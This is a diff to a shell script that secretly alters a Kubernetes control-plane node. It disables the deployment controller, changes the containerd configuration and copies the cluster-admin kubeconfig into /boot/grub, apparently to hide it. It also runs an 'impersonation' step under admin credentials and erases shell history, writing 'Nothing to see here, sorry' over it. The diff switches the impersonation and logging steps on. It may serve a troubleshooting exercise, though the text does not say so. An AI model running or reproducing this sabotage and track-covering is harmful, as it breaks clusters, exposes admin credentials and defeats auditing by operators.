@@ -5,7 +5,6 @@ unset HISTFILE
 export HISTSIZE=0
 
 kube_controller() {
-  #TODO: test it
   sed -i 's#--controllers=\*,bootstrapsigner,tokencleaner#--controllers=\*,bootstrapsigner,-deployment,tokencleaner#' /etc/kubernetes/manifests/kube-controller-manager.yaml
 }
 
@@ -20,8 +19,9 @@ kube_scheduler() {
 }
 
 containerd_logs() {
-  # shellcheck disable=SC2016
   mkdir -p /etc/containerd
+  
+  # shellcheck disable=SC2016
   cat << EOF > /etc/containerd/config.toml
 version = 2
 
@@ -30,6 +30,7 @@ version = 2
 EOF
 
   sed -i 's/KillMode=process/KillSignal=SIGKILL/' /lib/systemd/system/containerd.service
+  
   systemctl daemon-reload
   systemctl stop containerd
   systemctl start containerd
@@ -63,6 +64,10 @@ EOF
 }
 
 impersonation() {
+  if [ -f /boot/grub/admin.conf ]; then
+    return
+  fi
+  
   cp /etc/kubernetes/admin.conf /boot/grub/admin.conf
   kubectl apply --kubeconfig=/etc/kubernetes/admin.conf -f - <<YAML
 ---
@@ -148,10 +153,9 @@ EOF
 
 kube_controller
 kube_scheduler
-#containerd
-#impersonation
+impersonation
 apim
-#containerd_logs
+containerd_logs
 
 
 echo "Nothing to see here, sorry" > ~/.bash_history
